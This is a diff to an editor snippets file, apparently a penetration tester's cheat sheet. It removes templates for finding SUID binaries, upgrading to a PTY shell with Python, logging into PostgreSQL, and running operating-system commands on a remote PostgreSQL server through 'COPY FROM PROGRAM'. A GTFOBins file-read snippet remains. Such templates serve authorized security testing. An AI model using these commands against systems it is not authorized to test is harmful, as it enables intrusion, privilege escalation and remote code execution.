@@ -1,32 +1,4 @@
 {
-    "find executable with suid": {
-        "prefix": "find suid",
-        "body": [
-            "find / -perm -u=s -type f 2>/dev/null"
-        ],
-        "description": "find all files with suid permission"
-    },
-    "pty python console": {
-        "prefix": "pty python",
-        "body": [
-            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
-        ],
-        "description": "spawn a pty python console"
-    },
-    "psql login": {
-        "prefix": "psql",
-        "body": [
-            "psql -h ${1:$$RHOST} -U \"${2:$$USER}\" ${3:$$DATABASE} ${0}"
-        ],
-        "description": "login to psql as postgres user"
-    },
-    "psql rce with copy sql query": {
-        "prefix": "psql",
-        "body": [
-            "drop table if exists ${1:RESULT}; create table ${1:RESULT} (data text); copy ${1:RESULT} from program '${2:COMMAND}' with csv; select * from ${1:RESULT};${0}"
-        ],
-        "description": "execute command on remote psql server"
-    },
     "head file-read (gtfobins)": {
         "prefix": "head",
         "body": [
